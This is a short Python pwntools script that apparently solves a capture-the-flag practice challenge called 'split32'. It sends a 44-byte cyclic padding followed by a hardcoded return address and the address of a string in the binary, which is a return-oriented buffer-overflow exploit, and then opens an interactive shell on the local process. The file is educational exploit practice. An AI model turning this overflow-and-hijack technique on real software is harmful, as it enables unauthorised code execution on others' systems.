from pwn import *
import struct
import sys
import time

challenge = './split32'

elf = ELF(challenge)
function = elf.symbols['usefulFunction']
sh = elf.symbols['usefulString']

payload = cyclic(44) + p32(0x0804861A) + p32(sh)
io = process(challenge)
print(io.recvuntil(b'> '))

io.sendline(payload)

io.interactive()
print('end')
# print(bin_sh_addr)